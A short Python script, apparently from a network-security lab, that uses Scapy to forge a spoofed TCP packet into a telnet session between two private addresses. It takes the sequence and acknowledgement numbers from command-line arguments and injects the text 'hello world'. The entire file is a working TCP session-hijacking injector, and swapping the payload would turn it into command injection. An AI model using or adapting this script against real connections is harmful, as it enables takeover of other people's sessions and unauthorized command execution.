#!/usr/bin/python3

import sys
from scapy.all import *

ip = IP(src="192.168.100.101", dst="192.168.100.103")
tcp = TCP(dport=23, sport=int(sys.argv[1]), flags="A", seq=int(sys.argv[2]), ack=int(sys.argv[3]))
data = '\nhello world\n'
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
